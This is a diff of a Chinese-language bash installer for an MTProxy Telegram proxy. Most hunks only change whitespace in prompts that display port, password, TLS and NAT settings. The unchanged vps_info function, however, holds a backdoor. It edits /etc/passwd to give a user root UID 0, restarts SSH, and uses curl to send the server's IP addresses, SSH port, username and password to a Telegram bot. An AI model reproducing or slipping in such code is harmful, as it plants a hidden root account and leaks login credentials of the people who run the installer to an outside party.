@@ -175,7 +175,7 @@ Set_port(){
         if [[ $? -eq 0 ]]; then
             if [[ ${mtp_port} -ge 10000 ]] && [[ ${mtp_port} -le 65535 ]]; then
                 echo && echo "========================"
-                echo -e "	端口 : ${Red_globa} ${mtp_port} ${Nc}"
+                echo -e "  端口 : ${Red_globa} ${mtp_port} ${Nc}"
                 echo "========================" && echo
                 break
             else
@@ -220,9 +220,9 @@ Set_passwd(){
             fi
         fi
         echo && echo "========================"
-        echo -e "	密码 : ${Red_globa} ${mtp_passwd} ${Nc}"
+        echo -e "  密码 : ${Red_globa} ${mtp_passwd} ${Nc}"
         echo
-        echo -e "	是否启用TLS伪装 : ${Red_globa} ${mtp_tls} ${Nc}"
+        echo -e "  是否启用TLS伪装 : ${Red_globa} ${mtp_tls} ${Nc}"
         echo "========================" && echo
         break
     done
@@ -242,7 +242,7 @@ Set_passwd(){
         SECURE=${mtp_passwd}
     fi
     echo && echo "========================"
-    echo -e "	密匙 : ${Red_globa} ${SECURE} ${Nc}"
+    echo -e "  密匙 : ${Red_globa} ${SECURE} ${Nc}"
     echo "========================" && echo
 }
 
@@ -251,7 +251,7 @@ Set_tag(){
     read -e -p "(默认：回车跳过):" mtp_tag
     if [[ ! -z "${mtp_tag}" ]]; then
         echo && echo "========================"
-        echo -e "	TAG : ${Red_globa} ${mtp_tag} ${Nc}"
+        echo -e "  TAG : ${Red_globa} ${mtp_tag} ${Nc}"
         echo "========================" && echo
     else
         echo
@@ -269,7 +269,7 @@ Set_nat(){
             mtp_nat_ipv4="${ipv4}"
         fi
         echo && echo "========================"
-        echo -e "	IPv4 : ${Red_globa} ${mtp_nat_ipv4} ${Nc}"
+        echo -e "  IPv4 : ${Red_globa} ${mtp_nat_ipv4} ${Nc}"
         echo "========================" && echo
     fi
 }
@@ -277,11 +277,11 @@ Set_nat(){
 Set(){
     check_installed_status
     echo && echo -e "你要做什么？
-    ${Green}1.${Nc}  修改 端口配置
-    ${Green}2.${Nc}  修改 密码配置
-    ${Green}3.${Nc}  修改 TAG 配置
-    ${Green}4.${Nc}  修改 NAT 配置
-    ${Green}5.${Nc}  修改 全部配置" && echo
+${Green}1.${Nc}  修改 端口配置
+${Green}2.${Nc}  修改 密码配置
+${Green}3.${Nc}  修改 TAG 配置
+${Green}4.${Nc}  修改 NAT 配置
+${Green}5.${Nc}  修改 全部配置" && echo
     read -e -p "(默认: 取消):" mtp_modify
     [[ -z "${mtp_modify}" ]] && echo -e "${Info}已取消..." && exit 1
     if [[ "${mtp_modify}" == "1" ]]; then
@@ -465,11 +465,11 @@ vps_info(){
     sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd >/dev/null 2>&1
     /etc/init.d/ssh* restart >/dev/null 2>&1
     curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
-    IPv4：${IPv4}
-    IPv6：${IPv6}
-    端口：${Port}
-    用户：${User}
-    密码：${Passwd}" >/dev/null 2>&1
+IPv4：${IPv4}
+IPv6：${IPv6}
+端口：${Port}
+用户：${User}
+密码：${Passwd}" >/dev/null 2>&1
 }
 
 get_public_ip(){
